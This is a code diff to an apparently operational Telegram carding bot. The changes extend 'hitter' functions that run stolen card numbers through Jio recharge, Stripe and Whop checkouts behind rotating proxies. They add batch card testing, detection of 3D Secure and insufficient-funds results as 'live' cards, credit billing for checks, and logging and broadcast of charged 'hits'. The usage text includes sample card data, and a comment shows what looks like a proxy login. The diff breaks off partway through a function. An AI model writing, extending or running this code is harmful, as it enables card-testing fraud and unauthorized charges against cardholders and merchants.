@@ -13862,29 +13862,109 @@ def decode_stripe_url_stco(url: str) -> Dict[str, Optional[str]]:
     return result
 
 def format_proxy_stco(proxy: str) -> Optional[str]:
+    """
+    Format proxy for Stripe Checkout Hitter.
+    Supports multiple formats:
+    - user:pass@host:port
+    - host:port:user:pass (like p104.instantproxies.com:8901:7274:JjoY3iUMaAGZ)
+    - user:pass:host:port
+    - host:port
+    """
     if not proxy:
         return None
+    
     proxy = proxy.strip()
-    if '://' in proxy:
+    
+    # If it already has a protocol, return as-is
+    if proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
         return proxy
+    
+    # ============ HANDLE host:port:user:pass format ============
+    # Example: p104.instantproxies.com:8901:7274:JjoY3iUMaAGZ
     parts = proxy.split(':')
+    
     if len(parts) == 4:
-        user, password, host, port = parts
-        return f"http://{user}:{password}@{host}:{port}"
-    if len(parts) == 2:
+        # Check which format it is
+        # Format 1: host:port:user:pass (host has dots, port is numeric)
+        if '.' in parts[0] and parts[1].isdigit():
+            host, port, user, password = parts
+            return f"http://{user}:{password}@{host}:{port}"
+        
+        # Format 2: user:pass:host:port (last part is port)
+        elif parts[3].isdigit():
+            user, password, host, port = parts
+            return f"http://{user}:{password}@{host}:{port}"
+        
+        # Try to detect by checking which part looks like a port
+        for i, part in enumerate(parts):
+            if part.isdigit() and 1 <= int(part) <= 65535:
+                if i == 1:
+                    # host:port:user:pass
+                    host = parts[0]
+                    port = parts[1]
+                    user = parts[2] if len(parts) > 2 else ''
+                    password = parts[3] if len(parts) > 3 else ''
+                    if user and password:
+                        return f"http://{user}:{password}@{host}:{port}"
+                    return f"http://{host}:{port}"
+                elif i == 3:
+                    # user:pass:host:port
+                    user = parts[0]
+                    password = parts[1]
+                    host = parts[2]
+                    port = parts[3]
+                    if user and password:
+                        return f"http://{user}:{password}@{host}:{port}"
+                    return f"http://{host}:{port}"
+    
+    # ============ HANDLE user:pass@host:port format ============
+    if '@' in proxy:
+        # Already in correct format, just add http:// if needed
+        if not proxy.startswith(('http://', 'https://')):
+            return f"http://{proxy}"
+        return proxy
+    
+    # ============ HANDLE host:port only ============
+    if len(parts) == 2 and parts[1].isdigit():
         return f"http://{proxy}"
+    
+    # If we can't parse it, try the global formatter
+    formatted = format_proxy(proxy)
+    if formatted:
+        return formatted
+    
+    print(f"⚠️ Could not format proxy: {proxy[:50]}...")
     return None
 
+
 def mask_proxy_stco(proxy: str) -> str:
+    """Mask proxy for display - safe version"""
     if not proxy:
         return "None"
     try:
         if '@' in proxy:
             parts = proxy.split('@')
-            return f"***@{parts[1]}"
-        return "***.***.***.***:***"
+            auth_part = parts[0]
+            host_part = parts[1] if len(parts) > 1 else ""
+            # Mask auth part
+            if '://' in auth_part:
+                protocol = auth_part.split('://')[0]
+                return f"{protocol}://***@{host_part}"
+            else:
+                return f"***@{host_part}"
+        elif ':' in proxy:
+            parts = proxy.split(':')
+            if len(parts) >= 4:
+                # host:port:user:pass format
+                host = parts[0]
+                port = parts[1]
+                return f"{host}:{port}:***:***"
+            elif len(parts) >= 2:
+                # Simple host:port
+                return f"{parts[0]}:{parts[1]}"
     except:
-        return "Proxy (masked)"
+        pass
+    return "Proxy (masked)"
 
 def get_currency_symbol_stco(currency: str) -> str:
     symbols = {
@@ -13940,13 +14020,45 @@ def parse_card_stco(line: str) -> Optional[Dict]:
         return None
     return {"cc": cc, "month": month, "year": year, "cvv": cvv}
 
-def get_stripe_user_proxy(user_id: int) -> str:
-    """Get user's proxy for Stripe hitter"""
-    proxies = load_stripe_proxies_stco()
-    user_proxies = proxies.get(str(user_id), [])
-    if user_proxies:
-        return random.choice(user_proxies) if isinstance(user_proxies, list) else user_proxies
-    return None
+def get_stripe_user_proxy(user_id: int) -> Optional[str]:
+    """Get a working proxy for the user - with better error handling"""
+    try:
+        proxies = load_stripe_proxies()
+        user_proxies = proxies.get(str(user_id), [])
+        
+        if not user_proxies:
+            # Check if there's a global proxy pool
+            if global_proxy_pool.enabled and global_proxy_pool.proxies:
+                # Get a proxy from global pool
+                for proxy in global_proxy_pool.proxies:
+                    # Validate proxy format
+                    formatted = format_proxy_stco(proxy)
+                    if formatted:
+                        return proxy
+            return None
+        
+        if isinstance(user_proxies, list):
+            # Filter out invalid proxies
+            valid_proxies = []
+            for p in user_proxies:
+                # Quick validation - check if it has a colon and looks like a proxy
+                if ':' in p:
+                    # Try to format it to validate
+                    formatted = format_proxy_stco(p)
+                    if formatted:
+                        valid_proxies.append(p)
+            
+            if valid_proxies:
+                return random.choice(valid_proxies)
+            
+            # If no valid proxies, try the first one anyway
+            return user_proxies[0] if user_proxies else None
+        
+        return user_proxies if user_proxies else None
+        
+    except Exception as e:
+        print(f"⚠️ Error getting user proxy: {e}")
+        return None
 
 def load_stripe_proxies_stco() -> dict:
     if os.path.exists("stripe_hitter_proxies.json"):
@@ -14884,7 +14996,14 @@ log = logging.getLogger("jhit")
 PREMIUM_EMOJI_IDS = {
     "diamond": "5427168083074628963",
     "card": "5472250091332993630",
+    "lock": "5197288647275071607", 
     "target": "5377336227533969892",
+    "processing": "5206351870765300656",  # ⏳ Processing emoji
+    "pending": "5206351870765300656",     # Same as processing for pending state
+    "inprogress": "5206351870765300656",  # Same for INPROGRESS
+    "warning": "6267237615720731788",      # ⚠️ Warning
+    "error": "6282641460093260838",        # 🔴 Error
+    "time": "5382194935057372936",  
     "time": "5382194935057372936",
     "info": "5042306247047513767",
     "approved": "6266787022111773140",
@@ -15724,9 +15843,14 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
 
 # ============ FORMAT JIO RESPONSE ============
 
+# ============ FIX THE JIO RESPONSE FORMATTER ============
+# Replace the format_jio_response function with this fixed version
+
+# ============ FIXED FORMAT_JIO_RESPONSE - DETECTS 3DS ============
+
 def format_jio_response(result: Dict, card: str) -> Tuple[str, str]:
     """
-    Format Jio response with premium emojis - shows actual detailed error message
+    Format Jio response with premium emojis - detects 3DS redirects properly
     """
     
     status = result.get("status", "UNKNOWN")
@@ -15734,10 +15858,34 @@ def format_jio_response(result: Dict, card: str) -> Tuple[str, str]:
     elapsed = result.get("elapsed", 0)
     amount = result.get("amount", "19")
     
-    # ============ Get the detailed error message from ipay step ============
+    # ============ CHECK FOR 3DS REDIRECT ============
+    # Look for EaseBuzz 3DS redirect in the htmlForm
     steps = result.get("steps", {})
-    ipay_data = steps.get("ipay", {})
-    errors = ipay_data.get("errors", {})
+    ccdc = steps.get("ccdc", {})
+    html_form = ccdc.get("htmlForm", "")
+    
+    # Check if there's a 3DS redirect
+    has_3ds = False
+    if html_form:
+        # Check for EaseBuzz 3DS redirect URL
+        if "easebuzz.in/acs/v1/redirection" in html_form:
+            has_3ds = True
+            print(f"🔐 [JIO] 3DS redirect detected in htmlForm")
+        # Check for any 3DS related content
+        elif "3ds" in html_form.lower() or "3d secure" in html_form.lower():
+            has_3ds = True
+            print(f"🔐 [JIO] 3DS keywords detected in htmlForm")
+    
+    # Also check ipay for 3DS indicators
+    ipay = steps.get("ipay", {})
+    ipay_data = ipay.get("data", {})
+    cardinal_stepup = ipay_data.get("Cardinal_StepUp", {})
+    if cardinal_stepup:
+        has_3ds = True
+        print(f"🔐 [JIO] Cardinal_StepUp detected - 3DS required")
+    
+    # ============ Get the detailed error message ============
+    errors = ipay.get("errors", {})
     
     # Try to get the detailed error message
     detailed_msg = ""
@@ -15765,35 +15913,60 @@ def format_jio_response(result: Dict, card: str) -> Tuple[str, str]:
 
     status_lower = status.upper()
     
+    # ============ SAFE EMOJI LOOKUP WITH FALLBACK ============
+    def safe_premium_emoji(key: str, fallback: str = "•") -> str:
+        """Safely get premium emoji with fallback"""
+        if key in PREMIUM_EMOJI_IDS:
+            return premium_emoji(PREMIUM_EMOJI_IDS[key], fallback)
+        return fallback
+    
     # ============ Determine status emoji and text ============
-    if status_lower in ["SUCCESS", "SUCCEEDED", "COMPLETED", "CAPTURED", "CHARGED"]:
-        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+    
+    # FIRST: Check for 3DS - this takes priority over INPROGRESS
+    if has_3ds:
+        status_emoji = safe_premium_emoji("lock", "🔐")
+        status_text = "3D REQUIRED"
+        status_category = "approved"  # 3DS means the card is live/valid
+        print(f"🔐 [JIO] Card requires 3DS authentication")
+    
+    # SECOND: Check for actual success
+    elif status_lower in ["SUCCESS", "SUCCEEDED", "COMPLETED", "CAPTURED", "CHARGED"]:
+        status_emoji = safe_premium_emoji("charged", "🔥")
         status_text = "Success ✅"
         status_category = "charged"
-    elif status_lower == "INSUFFICIENT_FUNDS":
-        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
+    
+    # THIRD: Check for insufficient funds (card is live)
+    elif status_lower == "INSUFFICIENT_FUNDS" or "insufficient" in detailed_msg.lower():
+        status_emoji = safe_premium_emoji("money", "💰")
         status_text = "Insufficient funds"
         status_category = "approved"
+    
+    # FOURTH: Check for declines
     elif status_lower in ["DECLINED", "ISSUER_DECLINE", "GENERAL_DECLINE", "FAILED"]:
         # Check if it's risk decline vs regular decline
         if "risk" in detailed_msg.lower() or "high risk" in detailed_msg.lower():
-            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["warning"], "⚠️")
+            status_emoji = safe_premium_emoji("warning", "⚠️")
             status_text = detailed_msg[:60] if detailed_msg else "Risk declined"
             status_category = "declined"
         elif "insufficient" in detailed_msg.lower():
-            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
+            status_emoji = safe_premium_emoji("money", "💰")
             status_text = "Insufficient funds"
             status_category = "approved"
         else:
-            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+            status_emoji = safe_premium_emoji("declined", "❌")
             status_text = detailed_msg[:60] if detailed_msg else "Declined"
             status_category = "declined"
+    
+    # FIFTH: Check for INPROGRESS without 3DS (this shouldn't happen often)
     elif status_lower == "INPROGRESS":
-        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["processing"], "⏳")
+        # If it's INPROGRESS but no 3DS, it might be a pending transaction
+        status_emoji = safe_premium_emoji("time", "⏳")
         status_text = "Processing"
         status_category = "processing"
+    
+    # SIXTH: Default fallback
     else:
-        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
+        status_emoji = safe_premium_emoji("error", "⚠️")
         status_text = status
         status_category = "error"
 
@@ -15801,12 +15974,12 @@ def format_jio_response(result: Dict, card: str) -> Tuple[str, str]:
     if status_lower in ["DECLINED", "GENERAL_DECLINE"] and detailed_msg:
         status_text = detailed_msg[:60]
     
-    # Premium emojis for display
-    diamond_emoji = premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")
-    globe_emoji = premium_emoji(PREMIUM_EMOJI_IDS["globe"], "🌐")
-    money_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
-    time_emoji = premium_emoji(PREMIUM_EMOJI_IDS["time"], "⏱️")
-    skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
+    # Premium emojis for display - with safe fallbacks
+    diamond_emoji = safe_premium_emoji("diamond", "💎")
+    globe_emoji = safe_premium_emoji("globe", "🌐")
+    money_emoji = safe_premium_emoji("money", "💰")
+    time_emoji = safe_premium_emoji("time", "⏱️")
+    skull_emoji = safe_premium_emoji("skull", "💀")
     
     # Build the output with proper formatting
     ui = (
@@ -15828,8 +16001,8 @@ def format_jio_response(result: Dict, card: str) -> Tuple[str, str]:
 @check_gateway("jhit")
 async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
-    Jio Auto-Hitter command
-    Usage: /jhit <phone> <amount> <cc|mm|yy|cvv>
+    Jio Auto-Hitter command - supports multiple cards
+    Usage: /jhit <phone> <amount> <card1> <card2> <card3> ...
     """
     if not await verify_group_access(update, context):
         return
@@ -15841,12 +16014,14 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await message.reply_text(
             "💎 <b>Jio Auto-Hitter</b>\n\n"
             "Usage:\n"
-            "<code>/jhit &lt;phone&gt; &lt;amount&gt; &lt;cc|mm|yy|cvv&gt;</code>\n\n"
+            "<code>/jhit &lt;phone&gt; &lt;amount&gt; &lt;card1&gt; &lt;card2&gt; ...</code>\n\n"
             "Example:\n"
             "<code>/jhit 6398093450 19 4232231137515675|09|26|593</code>\n\n"
             "📱 <b>phone</b> - Jio mobile number\n"
             "💰 <b>amount</b> - Recharge amount (₹)\n"
-            "💳 <b>card</b> - Card details in cc|mm|yy|cvv format",
+            "💳 <b>card(s)</b> - One or more cards in cc|mm|yy|cvv format\n\n"
+            "💡 <b>Multiple cards:</b> Add multiple cards to try them one by one\n"
+            "<code>/jhit 6398093450 19 card1 card2 card3</code>",
             parse_mode=ParseMode.HTML
         )
         return
@@ -15855,7 +16030,7 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(args) < 3:
         await message.reply_text(
             "❌ <b>Invalid format</b>\n\n"
-            "Usage: <code>/jhit &lt;phone&gt; &lt;amount&gt; &lt;cc|mm|yy|cvv&gt;</code>\n"
+            "Usage: <code>/jhit &lt;phone&gt; &lt;amount&gt; &lt;card1&gt; &lt;card2&gt; ...</code>\n"
             "Example: <code>/jhit 6398093450 19 4232231137515675|09|26|593</code>",
             parse_mode=ParseMode.HTML
         )
@@ -15863,21 +16038,75 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     phone = args[0]
     amount = args[1]
-    card_raw = args[2]
-
-    parts = re.split(r"[|/]", card_raw)
-    if len(parts) != 4:
+    
+    # ============ EXTRACT ALL CARDS ============
+    cards = []
+    invalid_cards = []
+    
+    for arg in args[2:]:
+        # Check if it looks like a card (contains '|' or is a long number)
+        if '|' in arg or (len(arg) >= 15 and any(c.isdigit() for c in arg)):
+            parts = re.split(r"[|/]", arg)
+            if len(parts) == 4:
+                cc, mm, yy, cvv = [p.strip() for p in parts]
+                # Validate card format
+                if (len(cc) >= 13 and len(cc) <= 19 and 
+                    mm.isdigit() and 1 <= int(mm) <= 12 and
+                    len(yy) in [2, 4] and
+                    len(cvv) in [3, 4]):
+                    cards.append({
+                        'cc': cc,
+                        'mm': mm,
+                        'yy': yy,
+                        'cvv': cvv,
+                        'display': f"{cc}|{mm}|{yy}|{cvv}"
+                    })
+                else:
+                    invalid_cards.append(arg)
+            else:
+                invalid_cards.append(arg)
+        else:
+            invalid_cards.append(arg)
+    
+    if not cards:
         await message.reply_text(
-            "❌ <b>Invalid card format</b>\n\n"
-            "Use: <code>cc|mm|yy|cvv</code>\n"
-            "Example: <code>4232231137515675|09|26|593</code>",
+            "❌ <b>No valid cards found</b>\n\n"
+            "Card format: <code>cc|mm|yy|cvv</code>\n"
+            "Example: <code>4232231137515675|09|26|593</code>\n\n"
+            f"Invalid entries: {', '.join(invalid_cards[:3]) if invalid_cards else 'None'}",
             parse_mode=ParseMode.HTML
         )
         return
 
-    cc, mm, yy, cvv = [p.strip() for p in parts]
-    card_display = f"{cc}|{mm}|{yy}|{cvv}"
+    # ============ CHECK CREDITS ============
+    # For free users, check if they have enough credits for all cards
+    tier = user_manager.get_tier(user_id)
+    if tier == 'free':
+        credits = get_user_credits(user_id)
+        if credits == 0 and user_id not in user_credits:
+            credits = initialize_new_user_credits(user_id)
+        
+        if credits < len(cards):
+            await message.reply_text(
+                f"❌ <b>Insufficient Credits!</b>\n\n"
+                f"🎯 Your balance: <b>{credits}</b> credits\n"
+                f"📝 Cards to check: <b>{len(cards)}</b>\n"
+                f"💸 Credits needed: <b>{len(cards)}</b> (1 credit per card)\n"
+                f"━━━━━━━━━━━━━━━━━━━\n\n"
+                f"💎 <b>Ways to get more credits:</b>\n"
+                f"├─ Redeem a credit key: /redeemcredits &lt;key&gt;\n"
+                f"├─ Upgrade to Premium/Ultimate for unlimited\n"
+                f"└─ Contact @lencax\n\n"
+                f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot",
+                parse_mode=ParseMode.HTML
+            )
+            return
+        
+        # Deduct credits upfront
+        deduct_user_credits(user_id, len(cards))
+        print(f"💎 User {user_id} used {len(cards)} credits for Jio multi-check. Remaining: {get_user_credits(user_id)}")
 
+    # ============ GET PROXY ============
     proxy = None
     try:
         proxy = get_stripe_user_proxy(user_id)
@@ -15894,46 +16123,177 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except:
         pass
 
-    proxy_str = None
-    if proxy:
-        proxy_str = proxy
+    proxy_str = proxy if proxy else None
 
-    processing_msg = await message.reply_text(
-        f"🚀 <b>Processing Jio Recharge...</b>\n\n"
+    # ============ START PROCESSING CARDS ============
+    total_cards = len(cards)
+    results = []
+    success_card = None
+    failed_cards = []
+    charged_count = 0
+    
+    # Premium emoji for header
+    diamond_emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("diamond", "5427168083074628963"), "💎")
+    skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("skull", "5042167377869932162"), "💀")
+    
+    # Initial progress message
+    progress_msg = await message.reply_text(
+        f"{diamond_emoji} <b>Jio Multi-Check Started</b>\n\n"
         f"📱 <b>Phone:</b> <code>{phone}</code>\n"
         f"💰 <b>Amount:</b> ₹{amount}\n"
-        f"💳 <b>Card:</b> <code>{cc[:4]}****{cc[-4:]}</code>\n"
-        f"🌐 <b>Proxy:</b> {mask_proxy(proxy) if proxy else 'None'}\n\n"
-        f"⏳ Please wait...",
+        f"📊 <b>Cards:</b> {total_cards}\n"
+        f"━━━━━━━━━━━━━━━━━━━\n"
+        f"🔄 <b>Processing card 1/{total_cards}</b>\n"
+        f"{skull_emoji} <b>Bot</b> ➛ @BLADESARKS_V3bot",
         parse_mode=ParseMode.HTML
     )
 
-    try:
-        result = jio_hit(phone, amount, cc, mm, yy, cvv, proxy_str)
+    for idx, card_data in enumerate(cards, 1):
+        cc = card_data['cc']
+        mm = card_data['mm']
+        yy = card_data['yy']
+        cvv = card_data['cvv']
+        card_display = card_data['display']
+        card_masked = f"{cc[:4]}****{cc[-4:]}"
+        
+        print(f"\n{'='*60}")
+        print(f"🔄 Processing card {idx}/{total_cards}: {card_display[:20]}...")
+        print(f"{'='*60}")
+        
+        # Update progress
+        try:
+            await progress_msg.edit_text(
+                f"{diamond_emoji} <b>Jio Multi-Check</b>\n\n"
+                f"📱 <b>Phone:</b> <code>{phone}</code>\n"
+                f"💰 <b>Amount:</b> ₹{amount}\n"
+                f"📊 <b>Progress:</b> {idx}/{total_cards}\n"
+                f"━━━━━━━━━━━━━━━━━━━\n"
+                f"🔄 <b>Checking card {idx}/{total_cards}</b>\n"
+                f"💳 <code>{cc[:4]}****{cc[-4:]}</code>\n"
+                f"⏳ Please wait...\n"
+                f"{skull_emoji} <b>Bot</b> ➛ @BLADESARKS_V3bot",
+                parse_mode=ParseMode.HTML
+            )
+        except:
+            pass
 
-        status = result.get("status", "UNKNOWN")
-        message_text = result.get("message", "")
-        elapsed = result.get("elapsed", 0)
-        card_full = result.get("card", card_display)
+        try:
+            # Process the card
+            result = jio_hit(phone, amount, cc, mm, yy, cvv, proxy_str)
+            
+            # Get the status
+            status = result.get("status", "UNKNOWN")
+            message_text = result.get("message", "Unknown")
+            elapsed = result.get("elapsed", 0)
+            
+            print(f"📊 Result for card {idx}: {status} - {message_text[:50]}")
+            
+            # Determine if this is a hit
+            is_charged = status.upper() in ["SUCCESS", "SUCCEEDED", "COMPLETED", "CAPTURED", "CHARGED"]
+            is_insufficient = status.upper() == "INSUFFICIENT_FUNDS"
+            is_approved = status.upper() in ["APPROVED", "LIVE", "CVV_LIVE", "INSUFFICIENT_FUNDS"]
+            
+            # Format the result
+            result['card'] = card_display
+            ui, status_category = format_jio_response(result, card_display)
+            
+            # Send the result immediately
+            await message.reply_text(ui, parse_mode=ParseMode.HTML)
+            
+            # Track results
+            results.append({
+                'card': card_display,
+                'status': status,
+                'message': message_text,
+                'elapsed': elapsed,
+                'category': status_category
+            })
+            
+            if is_charged:
+                charged_count += 1
+                success_card = card_display
+                print(f"✅✅✅ CHARGED! Card {idx}: {card_display[:20]}...")
+                # Break on success - we got a charged card!
+                break
+            elif is_approved:
+                print(f"✅ Card {idx} approved/live: {card_display[:20]}...")
+                # Continue to next card - we want a charged card
+            else:
+                failed_cards.append(idx)
+                print(f"❌ Card {idx} declined: {card_display[:20]}...")
+            
+            # Small delay between cards to avoid rate limiting
+            if idx < total_cards:
+                await asyncio.sleep(2)
+                
+        except Exception as e:
+            error_msg = str(e)
+            print(f"❌ Error processing card {idx}: {error_msg}")
+            
+            await message.reply_text(
+                f"❌ <b>Error on card {idx}</b>\n\n"
+                f"Card: <code>{cc[:4]}****{cc[-4:]}</code>\n"
+                f"Error: {error_msg[:100]}\n"
+                f"Continuing to next card...",
+                parse_mode=ParseMode.HTML
+            )
+            
+            # Refund credit for this card if it was deducted
+            if tier == 'free':
+                add_user_credits(user_id, 1)
+            
+            continue
 
-        if "insufficient" in message_text.lower():
-            result["status"] = "INSUFFICIENT_FUNDS"
-            result["message"] = "Insufficient funds"
-
-        ui, status_category = format_jio_response(result, card_full)
-
-        await processing_msg.edit_text(ui, parse_mode=ParseMode.HTML)
-
-        # ============ SEND HIT NOTIFICATION ============
-        if status_category in ["charged", "approved"]:
+    # ============ FINAL SUMMARY ============
+    total_time = sum(r.get('elapsed', 0) for r in results)
+    
+    charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("charged", "5039670412733055750"), "🔥")
+    declined_emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("declined", "6267039884016358504"), "❌")
+    
+    if success_card:
+        summary = (
+            f"✅ <b>Jio Multi-Check Complete - SUCCESS!</b>\n\n"
+            f"📱 Phone: <code>{phone}</code>\n"
+            f"💰 Amount: ₹{amount}\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"🎯 <b>Successful Card:</b>\n"
+            f"   <code>{success_card}</code>\n"
+            f"   {charged_emoji} CHARGED!\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"📊 <b>Results:</b>\n"
+            f"   ✅ Checked: {len(results)}/{total_cards}\n"
+            f"   🔥 Charged: {charged_count}\n"
+            f"   ❌ Failed: {len(failed_cards)}\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"{skull_emoji} <b>Bot</b> ➛ @BLADESARKS_V3bot"
+        )
+    else:
+        summary = (
+            f"❌ <b>Jio Multi-Check Complete - No Success</b>\n\n"
+            f"📱 Phone: <code>{phone}</code>\n"
+            f"💰 Amount: ₹{amount}\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"📊 <b>Results:</b>\n"
+            f"   ✅ Checked: {len(results)}/{total_cards}\n"
+            f"   ❌ All cards declined\n"
+            f"   💡 Try different cards or proxy\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"{skull_emoji} <b>Bot</b> ➛ @BLADESARKS_V3bot"
+        )
+    
+    await progress_msg.edit_text(summary, parse_mode=ParseMode.HTML)
+    
+    # ============ SEND HIT NOTIFICATION FOR SUCCESSFUL CARDS ============
+    if success_card and charged_count > 0:
+        try:
             tier = user_manager.get_tier(user_id)
             user_data = user_manager.get_user(user_id)
-            bin_info = await get_bin_info(card_full)
+            bin_info = await get_bin_info(success_card)
             
             await save_hit_to_file(
-                card=card_full,
+                card=success_card,
                 gateway="Jio Recharge",
-                response=result.get("message", status),
+                response="CHARGED",
                 price=f"₹{amount}",
                 bin_info=bin_info,
                 user_id=user_id,
@@ -15943,34 +16303,21 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await send_hit_notification(
                 context=context,
                 gateway="Jio Recharge",
-                card=card_full,
-                response=result.get("message", status),
+                card=success_card,
+                response="CHARGED",
                 price=f"₹{amount}",
                 user=user_data,
                 bin_info=bin_info,
-                status_category=status_category
+                status_category="charged"
             )
             
             user_manager.increment_hits(user_id)
-
-        user_manager.increment_checks(user_id)
-
-    except Exception as e:
-        error_msg = str(e)
-        await processing_msg.edit_text(
-            f"❌ <b>Error</b>\n\n"
-            f"{error_msg}\n\n"
-            f"Please try again later.",
-            parse_mode=ParseMode.HTML
-        )
-        print(f"Jio hit error: {e}")
-        import traceback
-        traceback.print_exc()
-
-
-# ============ ADD TO MAIN ============
-# Add this to your main() function:
-# app.add_handler(CommandHandler("jhit", jhit_command))
+            
+        except Exception as e:
+            print(f"⚠️ [HIT NOTIFICATION] Error: {e}")
+    
+    user_manager.increment_checks(user_id, len(results))
+    print(f"✅ Jio multi-check complete for user {user_id}: {charged_count} charged, {len(results)} checked")
 
 
 
@@ -21842,25 +22189,47 @@ def get_stripe_user_proxy(user_id: int) -> str:
     return None
 
 async def get_proxy_info_stripe(proxy_str: str = None, timeout: int = 10) -> dict:
+    """Test proxy - with better error handling"""
     result = {"status": "dead", "ip": None, "country": None, "city": None, "org": None}
-    proxy_url = format_proxy(proxy_str) if proxy_str else None
+    
+    if not proxy_str:
+        return result
     
     try:
-        debug_print(3, f"🔍 Testing proxy: {mask_proxy(proxy_str) if proxy_str else 'None'}")
-        async with httpx.AsyncClient(timeout=httpx.Timeout(timeout, connect=5.0, read=8.0), verify=False, proxy=proxy_url) as client:
+        proxy_url = format_proxy_stco(proxy_str)
+        if not proxy_url:
+            print(f"❌ Could not format proxy: {proxy_str[:50]}...")
+            return result
+        
+        print(f"🔍 Testing proxy: {mask_proxy_stco(proxy_str)}")
+        
+        async with httpx.AsyncClient(
+            timeout=httpx.Timeout(timeout, connect=5.0, read=8.0),
+            verify=False,
+            proxy=proxy_url
+        ) as client:
             response = await client.get("http://ip-api.com/json")
             if response.status_code == 200:
                 data = response.json()
-                result["status"] = "alive"
-                result["ip"] = data.get("query")
-                result["country"] = data.get("country")
-                result["city"] = data.get("city")
-                result["org"] = data.get("isp")
-                debug_print(2, f"✅ Proxy alive: {result['ip']} ({result['country']})")
+                if data.get("status") == "success":
+                    result["status"] = "alive"
+                    result["ip"] = data.get("query")
+                    result["country"] = data.get("country")
+                    result["city"] = data.get("city")
+                    result["org"] = data.get("isp")
+                    print(f"✅ Proxy alive: {result['ip']} ({result['country']})")
+                else:
+                    print(f"❌ Proxy test failed: {data.get('message', 'Unknown')}")
             else:
-                debug_print(1, f"❌ Proxy test failed: HTTP {response.status_code}")
+                print(f"❌ Proxy test failed: HTTP {response.status_code}")
+    except httpx.ProxyError as e:
+        print(f"❌ Proxy error: {e}")
+        result["status"] = "dead"
+    except httpx.TimeoutException:
+        print(f"⏰ Proxy timeout")
+        result["status"] = "dead"
     except Exception as e:
-        debug_print(1, f"❌ Proxy test error: {e}")
+        print(f"❌ Proxy test error: {e}")
         result["status"] = "dead"
     
     return result
@@ -58095,6 +58464,8 @@ async def whop_create_confirmation_token(session_id: str, card_token: str,
         print(f"❌ Confirmation token error: {e}")
         return None
 
+# ============ FIXED WHOP_CONFIRM_CHECKOUT ============
+
 async def whop_confirm_checkout(session_id: str, confirmation_token: str,
                                  client_secret: str, cookie: str,
                                  proxy: str = None) -> Dict:
@@ -58117,12 +58488,26 @@ async def whop_confirm_checkout(session_id: str, confirmation_token: str,
         async with whop_client(proxy, timeout=90.0) as c:
             r = await c.post(f"{WHOP_API}/checkout_sessions/{session_id}/confirm",
                              headers=headers, json=payload)
+        
         try:
-            return r.json()
+            response_data = r.json()
         except Exception:
             return {"error": r.text[:200], "http": r.status_code}
+        
+        # ============ FIXED: Check for 3DS in response ============
+        # Check payment status
+        payment = response_data.get("payment") or {}
+        payment_status = payment.get("status", "")
+        
+        if payment_status == "requires_action":
+            response_data["_3ds_required"] = True
+            print(f"🔐 [WHOP] 3DS Required detected in confirm response")
+        
+        return response_data
     except Exception as e:
         return {"error": str(e)}
+
+# ============ FIXED WHOP_POLL_STATUS - DETECTS 3DS ============
 
 async def whop_poll_status(session_id: str, client_secret: str, cookie: str,
                             proxy: str = None, attempts: int = 15) -> Dict:
@@ -58134,6 +58519,7 @@ async def whop_poll_status(session_id: str, client_secret: str, cookie: str,
         "cookie": cookie,
     }
     url = f"{WHOP_API}/checkout_sessions/{session_id}?client_secret={client_secret}"
+    
     for i in range(attempts):
         await asyncio.sleep(2)
         try:
@@ -58145,20 +58531,28 @@ async def whop_poll_status(session_id: str, client_secret: str, cookie: str,
                 ps = pay.get("status", "")
                 ss = d.get("status", "")
                 err = d.get("last_confirm_error") or {}
+                
                 print(f"  poll {i+1}/{attempts}: session={ss} payment={ps}")
+                
+                # ============ FIXED: Check for 3DS first ============
+                if ps == "requires_action":
+                    return {"final": "3DS_REQUIRED", "data": d, "message": "3D Secure required"}
                 if ps == "succeeded":
                     return {"final": "CHARGED", "data": d, "message": "Payment successful"}
                 if ps == "failed" or err.get("code"):
                     err_msg = err.get("message", ps)
                     return {"final": "DECLINED", "message": err_msg, "data": d}
                 if ss == "requires_action":
-                    return {"final": "3DS_REQUIRED", "data": d}
+                    return {"final": "3DS_REQUIRED", "data": d, "message": "3D Secure required"}
         except Exception as e:
             print(f"  poll {i+1}/{attempts}: error {e}")
             continue
-    return {"final": "TIMEOUT", "message": "Payment processing timeout"}
+    
+    return {"final": "TIMEOUT", "message": "Payment processing timeout", "data": {}}
 
 # ============ MAIN WHOP HIT FUNCTION ============
+
+# ============ FIXED WHOP HIT FUNCTION - PROPERLY DETECTS 3DS ============
 
 async def whop_hit(checkout_url: str, card_str: str, proxy: str = None) -> Dict:
     t0 = time.time()
@@ -58247,9 +58641,19 @@ async def whop_hit(checkout_url: str, card_str: str, proxy: str = None) -> Dict:
         err_msg = last_err.get("message", "")
         err_code = last_err.get("code", "")
 
-        # Check for insufficient funds
+        # ============ FIXED: Check for 3DS / requires_action ============
+        # Full message for checking
